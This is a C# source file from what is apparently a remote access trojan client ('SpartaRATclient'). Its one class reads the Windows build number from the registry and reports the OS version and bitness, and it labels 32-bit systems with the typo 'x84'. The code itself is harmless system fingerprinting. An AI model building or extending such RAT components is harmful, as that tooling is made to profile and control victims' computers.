using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SpartaRATclient.Setup.OSType
{
    public class OSTypes
    {
        public string Type()
        {
            int osBuild = int.Parse(Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuildNumber", "").ToString());
            string Type = Environment.Is64BitOperatingSystem ? "x64" : "x84";

            if (osBuild >= 22000)
                return "Windows 11 " + Type;
            if (osBuild >= 10240 && osBuild <= 19045)
                return "Windows 10 " + Type;
            else
                return "Windows 8/Older " + Type;
        }
    }
}
